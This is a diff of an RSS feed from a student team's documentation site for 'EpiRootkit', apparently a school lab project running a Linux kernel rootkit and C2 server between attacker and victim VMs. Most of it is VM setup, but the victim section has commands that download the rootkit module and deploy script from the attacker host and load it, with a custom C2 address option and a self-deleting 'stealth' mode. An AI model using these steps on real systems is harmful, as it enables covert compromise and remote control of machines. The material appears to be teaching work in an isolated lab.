@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Fri, 30 May 2025 20:52:51 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sat, 31 May 2025 18:51:21 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
  &lt;div style="flex: 1; min-width: 250px; text-align: center;">
  &lt;strong>Capitaine&lt;/strong>: Hugo Sibony 
  &lt;br>
@@ -13,10 +13,87 @@
  
 &lt;h2 id="nom-de-léquipe">Nom de l&amp;rsquo;équipe &lt;a href="#nom-de-l%c3%a9quipe" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Nous sommes Tux Fan Club 🐧&lt;/p>
 &lt;p>C&amp;rsquo;est Léa qui a choisi le nom car c&amp;rsquo;est la seule personne du groupe un peu créative 👀&lt;/p>
-&lt;p>(Et par ce que Hugo est gentleman et a laissé le choix a la seule femme du groupe)&lt;/p></description></item><item><title>Initial Setup &amp; Installation</title><link>/docs/02-setup/environment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/environment/</guid><description>&lt;h1 id="host-environment-setup-from-a-blank-system">Host Environment Setup (from a Blank System) &lt;a href="#host-environment-setup-from-a-blank-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
-&lt;p>&lt;strong>Assumption:&lt;/strong> You are starting from a fresh Ubuntu 24.10 (amd64) install with no extra packages.&lt;/p>
+&lt;p>(Et par ce que Hugo est gentleman et a laissé le choix a la seule femme du groupe)&lt;/p></description></item><item><title>Host Environment Setup</title><link>/docs/02-setup/environment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/environment/</guid><description>&lt;h1 id="host-environment-setup">Host Environment Setup &lt;a href="#host-environment-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
+&lt;p>&lt;strong>Purpose:&lt;/strong> Configure Ubuntu 24.10 host to run attacker and victim VMs. The actual EpiRootkit components run INSIDE the VMs.&lt;/p>
 &lt;/blockquote>
-&lt;h2 id="1-update-system">1. Update System &lt;a href="#1-update-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;h2 id="setup-method">Setup Method &lt;a href="#setup-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;nav>
+	&lt;div class="nav nav-tabs" id="nav-tab" role="tablist">
+
+		
+		
+		
+		
+
+		
+
+		&lt;a class="nav-link active"
+		 id="acfbedTab" data-bs-toggle="tab" data-bs-target="#acfbed"
+		 type="button" role="tab" aria-controls="acfbed" aria-selected="true">Automated Setup (Recommended)&lt;/a>
+
+		
+
+		&lt;a class="nav-link "
+		 id="afecbdTab" data-bs-toggle="tab" data-bs-target="#afecbd"
+		 type="button" role="tab" aria-controls="afecbd" aria-selected="true">Manual Step-by-Step&lt;/a>
+
+		
+
+	&lt;/div>
+&lt;/nav>
+
+&lt;div class="tab-content" id="nav-tab-content">
+
+	
+
+
+
+
+
+
+
+&lt;div class="tab-pane fade show active" id="acfbed" role="tabpanel" aria-labelledby="nav-1">
+
+	&lt;h3 id="one-command-installation">One-Command Installation &lt;a href="#one-command-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Run the automated setup script to install all dependencies:&lt;/p>
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="6debccf" class="language-bash ">
+ &lt;code>./scripts/install_dependencies.sh&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>&lt;strong>What it installs:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>QEMU/KVM&lt;/strong>: Virtual machine hypervisor&lt;/li>
+&lt;li>&lt;strong>libvirt&lt;/strong>: VM management daemon and tools&lt;/li>
+&lt;li>&lt;strong>Bridge utils&lt;/strong>: Network bridge configuration&lt;/li>
+&lt;li>&lt;strong>User permissions&lt;/strong>: Adds you to libvirt group&lt;/li>
+&lt;/ul>
+
+
+&lt;/div>
+
+
+
+
+
+
+
+&lt;div class="tab-pane fade" id="afecbd" role="tabpanel" aria-labelledby="nav-1">
+
+	&lt;h3 id="1-update-system">1. Update System &lt;a href="#1-update-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -35,8 +112,7 @@
  &lt;code>sudo apt update &amp;amp;&amp;amp; sudo apt upgrade -y&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="2-install-essential-packages">2. Install Essential Packages &lt;a href="#2-install-essential-packages" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Install all required tools for virtualization, development, and Node.js:&lt;/p>
-
+&lt;h3 id="2-install-vm-management-tools">2. Install VM Management Tools &lt;a href="#2-install-vm-management-tools" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -51,13 +127,65 @@
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="b8ce25f" class="language-bash ">
- &lt;code>sudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils build-essential linux-headers-$(uname -r) curl git nodejs npm&lt;/code>
+ &lt;pre id="9f50dab" class="language-bash ">
+ &lt;code>sudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;blockquote>
-&lt;p>&lt;strong>Tip:&lt;/strong> If you get an error about missing kernel headers, ensure your kernel version matches the installed headers. Use &lt;code>uname -r&lt;/code> and &lt;code>apt search linux-headers&lt;/code> to check.&lt;/p></description></item><item><title>VM Installation &amp; Verification</title><link>/docs/02-setup/vm-installation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/vm-installation/</guid><description>&lt;h1 id="virtual-machine-installation--verification">Virtual Machine Installation &amp;amp; Verification &lt;a href="#virtual-machine-installation--verification" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
-&lt;p>&lt;strong>You must have completed &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/environment/'>&lt;p>SETUP&lt;/p>&lt;strong>Initial Setup &amp; Installation&lt;/strong>&lt;br>Prepare your host system from scratch for the EpiRootkit project.&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/environment/">Initial Setup &amp;amp; Installation&lt;/a> before proceeding.&lt;/strong>&lt;/p>
+&lt;h3 id="3-configure-libvirt">3. Configure Libvirt &lt;a href="#3-configure-libvirt" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="d6a02f1" class="language-bash ">
+ &lt;code># Enable and start libvirt daemon
+sudo systemctl enable --now libvirtd
+
+# Add current user to libvirt group
+sudo usermod -aG libvirt $USER
+
+# Activate group membership (required before using VMs)
+newgrp libvirt&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="4-optional-documentation-tools">4. Optional: Documentation Tools &lt;a href="#4-optional-documentation-tools" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="960483f" class="language-bash ">
+ &lt;code># Only if you want to build docs locally
+sudo apt install -y hugo&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+
+
+&lt;/div>
+
+
+
+&lt;/div>
+&lt;h2 id="verification">Verification &lt;a href="#verification" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>After completing either setup method, verify your installation:&lt;/p></description></item><item><title>VM Installation &amp; Verification</title><link>/docs/02-setup/vm-installation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/vm-installation/</guid><description>&lt;h1 id="virtual-machine-installation--verification">Virtual Machine Installation &amp;amp; Verification &lt;a href="#virtual-machine-installation--verification" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
+&lt;p>&lt;strong>You must have completed &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/environment/'>&lt;p>SETUP&lt;/p>&lt;strong>Host Environment Setup&lt;/strong>&lt;br>Prepare your host system for running EpiRootkit VMs&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/environment/">Initial Setup &amp;amp; Installation&lt;/a> before proceeding.&lt;/strong>&lt;/p>
 &lt;/blockquote>
 &lt;h2 id="1-choose-your-vm-setup-method">1. Choose Your VM Setup Method &lt;a href="#1-choose-your-vm-setup-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 &lt;nav>
@@ -71,14 +199,14 @@
 		
 
 		&lt;a class="nav-link active"
-		 id="facbdeTab" data-bs-toggle="tab" data-bs-target="#facbde"
-		 type="button" role="tab" aria-controls="facbde" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
+		 id="dfbceaTab" data-bs-toggle="tab" data-bs-target="#dfbcea"
+		 type="button" role="tab" aria-controls="dfbcea" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="fcdabeTab" data-bs-toggle="tab" data-bs-target="#fcdabe"
-		 type="button" role="tab" aria-controls="fcdabe" aria-selected="true">Build Disks Yourself&lt;/a>
+		 id="dcbfeaTab" data-bs-toggle="tab" data-bs-target="#dcbfea"
+		 type="button" role="tab" aria-controls="dcbfea" aria-selected="true">Build Disks Yourself&lt;/a>
 
 		
 
@@ -95,117 +223,339 @@
 
 
 
-&lt;div class="tab-pane fade show active" id="facbde" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="dfbcea" role="tabpanel" aria-labelledby="nav-1">
 
-	&lt;h3 id="download-pre-built-images">Download Pre-built Images &lt;a href="#download-pre-built-images" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Download both QCOW2 images and place them in the &lt;code>vm/&lt;/code> directory at the project root:&lt;/p></description></item><item><title>Attacking VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;p>Follow these steps once the host environment is ready and the VMs have been created or downloaded.&lt;/p>
-&lt;h2 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
-&lt;li>Ensure the &lt;code>attacker.qcow2&lt;/code> disk is in the &lt;code>vm/&lt;/code> directory (verify via &lt;code>./scripts/check_vms.sh&lt;/code> or see &lt;a href="/docs/02-setup/vm-installation/">VM Installation &amp;amp; Verification&lt;/a>).&lt;/li>
-&lt;li>Launch the attacking VM with:
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="b9b360f" class="language-bash ">
- &lt;code>sudo ./scripts/run_vms.sh attacker&lt;/code>
- &lt;/pre>
- &lt;/div>
-Or both VMs with:
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="fc8077c" class="language-bash ">
- &lt;code>sudo ./scripts/run_vms.sh&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;/li>
-&lt;li>On the attacking VM:
-&lt;ul>
-&lt;li>Auto-login is enabled for user &lt;code>attacker&lt;/code> (no password prompt).&lt;/li>
-&lt;li>The static IP is &lt;strong>192.168.200.11&lt;/strong>.&lt;/li>
-&lt;li>The password is &lt;code>jules&lt;/code>.&lt;/li>
-&lt;/ul>
-&lt;/li>
+	&lt;h3 id="download-pre-built-images">Download Pre-built Images &lt;a href="#download-pre-built-images" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Download both QCOW2 images and place them in the &lt;code>vm/&lt;/code> directory at the project root:&lt;/p></description></item><item><title>Attacker VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;h1 id="attacker-vm-setup">Attacker VM Setup &lt;a href="#attacker-vm-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Configure the attacking VM with Node.js C2 server and React web interface.&lt;/p>
+&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Host setup complete&lt;/strong>: &lt;a href="/docs/02-setup/environment/">Host Environment Setup&lt;/a>&lt;/li>
+&lt;li>&lt;strong>VM downloaded&lt;/strong>: &lt;code>vm/attacker.qcow2&lt;/code> in project root&lt;/li>
+&lt;li>&lt;strong>VM launched&lt;/strong>: &lt;code>sudo ./scripts/run_vms.sh attacker&lt;/code>&lt;/li>
 &lt;/ol>
-&lt;p>For more details on the network configuration and helper scripts, see &lt;a href="/docs/02-setup/environment/#how-it-works">Initial Setup &amp;amp; Installation&lt;/a>.&lt;/p></description></item><item><title>Victim VM Setup</title><link>/docs/02-setup/victim-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/victim-vm-setup/</guid><description>&lt;p>Follow these steps once the host environment is ready and the VMs have been created or downloaded.&lt;/p>
-&lt;ol>
-&lt;li>
-&lt;p>Place the &lt;code>victim.qcow2&lt;/code> disk in the &lt;code>vm/&lt;/code> directory at the project root (verify via &lt;code>./scripts/check_vms.sh&lt;/code> or see &lt;a href="/docs/02-setup/vm-installation/">VM Installation &amp;amp; Verification&lt;/a>).&lt;/p>
-&lt;/li>
-&lt;li>
-&lt;p>Launch the victim VM with:&lt;/p>
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="39be92f" class="language-bash ">
- &lt;code>sudo ./scripts/run_vms.sh victim&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;p>Or both VMs with:&lt;/p>
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="fc8077c" class="language-bash ">
- &lt;code>sudo ./scripts/run_vms.sh&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;/li>
-&lt;li>
-&lt;p>On the victim VM:&lt;/p>
+&lt;h2 id="vm-access">VM Access &lt;a href="#vm-access" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>Connection Details:&lt;/strong>&lt;/p>
 &lt;ul>
-&lt;li>The VM has auto-login enabled for the &lt;code>victim&lt;/code> user (no password prompt).&lt;/li>
-&lt;li>Its static IP is &lt;strong>192.168.200.10&lt;/strong>.&lt;/li>
-&lt;li>The password is &lt;code>jules&lt;/code>.&lt;/li>
+&lt;li>&lt;strong>IP Address&lt;/strong>: 192.168.200.11 (static)&lt;/li>
+&lt;li>&lt;strong>Username&lt;/strong>: &lt;code>attacker&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Password&lt;/strong>: &lt;code>jules&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Auto-login&lt;/strong>: Enabled (no password prompt)&lt;/li>
 &lt;/ul>
-&lt;/li>
-&lt;li>
-&lt;p>When finished, close the QEMU window or use &lt;strong>Ctrl+C&lt;/strong> on the host script to shut down both VMs.&lt;/p></description></item><item><title>Overview</title><link>/docs/03-attacking-program/overview/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;h1 id="c2-server-overview">C2 Server Overview &lt;a href="#c2-server-overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Professional Command &amp;amp; Control server for managing EpiRootkit connections.&lt;/p>
+&lt;h2 id="setup-method">Setup Method &lt;a href="#setup-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;nav>
+	&lt;div class="nav nav-tabs" id="nav-tab" role="tablist">
+
+		
+		
+		
+		
+
+		
+
+		&lt;a class="nav-link active"
+		 id="edabcfTab" data-bs-toggle="tab" data-bs-target="#edabcf"
+		 type="button" role="tab" aria-controls="edabcf" aria-selected="true">Pre-built Disk (Recommended)&lt;/a>
+
+		
+
+		&lt;a class="nav-link "
+		 id="cdaefbTab" data-bs-toggle="tab" data-bs-target="#cdaefb"
+		 type="button" role="tab" aria-controls="cdaefb" aria-selected="true">Self-build from Scratch&lt;/a>
+
+		
+
+	&lt;/div>
+&lt;/nav>
+
+&lt;div class="tab-content" id="nav-tab-content">
+
+	
+
+
+
+
+
+
+
+&lt;div class="tab-pane fade show active" id="edabcf" role="tabpanel" aria-labelledby="nav-1">
+
+	&lt;h3 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Everything is already set up, so you can immediately build and run:&lt;/p></description></item><item><title>Victim VM Setup</title><link>/docs/02-setup/victim-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/victim-vm-setup/</guid><description>&lt;h1 id="victim-vm-setup">Victim VM Setup &lt;a href="#victim-vm-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Deploy the EpiRootkit kernel module on the victim system.&lt;/p>
+&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Host setup complete&lt;/strong>: &lt;a href="/docs/02-setup/environment/">Host Environment Setup&lt;/a>&lt;/li>
+&lt;li>&lt;strong>VM downloaded&lt;/strong>: &lt;code>vm/victim.qcow2&lt;/code> in project root&lt;/li>
+&lt;li>&lt;strong>VM launched&lt;/strong>: &lt;code>sudo ./scripts/run_vms.sh victim&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;h2 id="vm-access">VM Access &lt;a href="#vm-access" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>Connection Details:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>IP Address&lt;/strong>: 192.168.200.10 (static)&lt;/li>
+&lt;li>&lt;strong>Username&lt;/strong>: &lt;code>victim&lt;/code> / &lt;strong>Password&lt;/strong>: &lt;code>jules&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Target&lt;/strong>: Ubuntu 20.04 LTS with kernel 5.4.0&lt;/li>
+&lt;/ul>
+&lt;h2 id="deployment-process">Deployment Process &lt;a href="#deployment-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-receive-payload">1. Receive Payload &lt;a href="#1-receive-payload" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Get the rootkit files from the attacker VM:&lt;/p>
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="e9a67ad" class="language-bash ">
+ &lt;code># Option A: HTTP download
+wget http://192.168.200.11:8080/epirootkit.ko
+wget http://192.168.200.11:8080/deploy_rootkit.sh
+
+# Option B: SCP transfer
+# Files transferred by attacker to victim@192.168.200.10:~/
+
+# Option C: Web UI upload
+# Use attacker&amp;#39;s web interface file transfer panel&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="2-deploy-rootkit">2. Deploy Rootkit &lt;a href="#2-deploy-rootkit" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="623a725" class="language-bash ">
+ &lt;code># Simple deployment (connects to 192.168.200.11:4444)
+sudo ./deploy_rootkit.sh
+
+# Custom C2 server
+sudo ./deploy_rootkit.sh address=IP port=PORT
+
+# Stealth deployment (self-destructs)
+sudo ./deploy_rootkit.sh --self-delete&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="3-verify-connection">3. Verify Connection &lt;a href="#3-verify-connection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Switch to attacker VM C2 server:&lt;/p></description></item><item><title>Host to VM File Transfer</title><link>/docs/02-setup/file-transfer/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/02-setup/file-transfer/</guid><description>&lt;h1 id="host-to-vm-file-transfer">Host to VM File Transfer &lt;a href="#host-to-vm-file-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Guide for transferring files from the host system to QEMU virtual machines.&lt;/p>
+&lt;h2 id="transfer-methods">Transfer Methods &lt;a href="#transfer-methods" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;nav>
+	&lt;div class="nav nav-tabs" id="nav-tab" role="tablist">
+
+		
+		
+		
+		
+
+		
+
+		&lt;a class="nav-link active"
+		 id="cadebfTab" data-bs-toggle="tab" data-bs-target="#cadebf"
+		 type="button" role="tab" aria-controls="cadebf" aria-selected="true">Automated Script (Recommended)&lt;/a>
+
+		
+
+		&lt;a class="nav-link "
+		 id="bfdceaTab" data-bs-toggle="tab" data-bs-target="#bfdcea"
+		 type="button" role="tab" aria-controls="bfdcea" aria-selected="true">Manual SCP/SSH&lt;/a>
+
+		
+
+		&lt;a class="nav-link "
+		 id="cdabefTab" data-bs-toggle="tab" data-bs-target="#cdabef"
+		 type="button" role="tab" aria-controls="cdabef" aria-selected="true">HTTP Server&lt;/a>
+
+		
+
+		&lt;a class="nav-link "
+		 id="fbceadTab" data-bs-toggle="tab" data-bs-target="#fbcead"
+		 type="button" role="tab" aria-controls="fbcead" aria-selected="true">Other Methods&lt;/a>
+
+		
+
+	&lt;/div>
+&lt;/nav>
+
+&lt;div class="tab-content" id="nav-tab-content">
+
+	
+
+
+
+
+
+
+
+&lt;div class="tab-pane fade show active" id="cadebf" role="tabpanel" aria-labelledby="nav-1">
+
+	&lt;h3 id="one-command-transfer">One-Command Transfer &lt;a href="#one-command-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>For attacker VM setup, use the automated deployment script:&lt;/p>
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="aecd187" class="language-bash ">
+ &lt;code># From host project directory
+./scripts/deploy_to_attacker.sh
+
+# ✅ Transfers entire project via SSH/SCP
+# ✅ Runs setup script remotely
+# ✅ Installs all dependencies
+# 🎉 Ready to build and start&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="what-it-does">What It Does &lt;a href="#what-it-does" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>Checks connectivity&lt;/strong>: VM reachable via SSH&lt;/li>
+&lt;li>&lt;strong>Transfers files&lt;/strong>: Complete project to &lt;code>~/epirootkit&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Runs setup&lt;/strong>: Executes dependency installation&lt;/li>
+&lt;li>&lt;strong>Verifies&lt;/strong>: All components ready&lt;/li>
+&lt;/ol>
+&lt;h3 id="requirements">Requirements &lt;a href="#requirements" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>VM running with SSH enabled&lt;/li>
+&lt;li>Network connectivity between host and VM&lt;/li>
+&lt;li>VM credentials: &lt;code>attacker@192.168.200.11&lt;/code> (password: &lt;code>jules&lt;/code>)&lt;/li>
+&lt;/ul>
+
+
+&lt;/div>
+
+
+
+
+
+
+
+&lt;div class="tab-pane fade" id="bfdcea" role="tabpanel" aria-labelledby="nav-1">
+
+	&lt;h3 id="enable-ssh-in-vm">Enable SSH in VM &lt;a href="#enable-ssh-in-vm" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="882694e" class="language-bash ">
+ &lt;code># Inside the VM
+sudo apt update &amp;amp;&amp;amp; sudo apt install -y openssh-server
+sudo systemctl enable --now ssh&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="transfer-files">Transfer Files &lt;a href="#transfer-files" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="571da82" class="language-bash ">
+ &lt;code># From host to VM
+scp -r /path/to/epirootkit attacker@192.168.200.11:~/
+scp -r /path/to/epirootkit victim@192.168.200.10:~/
+
+# Transfer specific files
+scp deploy_rootkit.sh epirootkit.ko victim@192.168.200.10:~/&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+
+
+&lt;/div>
+
+
+
+
+
+
+
+&lt;div class="tab-pane fade" id="cdabef" role="tabpanel" aria-labelledby="nav-1">
+
+	&lt;h3 id="setup-server-on-host">Setup Server on Host &lt;a href="#setup-server-on-host" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="d380407" class="language-bash ">
+ &lt;code># From project directory
+cd /path/to/epirootkit
+python3 -m http.server 8080&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="download-in-vm">Download in VM &lt;a href="#download-in-vm" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="c335b2d" class="language-bash ">
+ &lt;code># Inside VM
+wget http://192.168.200.1:8080/filename
+
+# Download entire project
+wget -r -np -nH --cut-dirs=1 http://192.168.200.1:8080/&lt;/code>
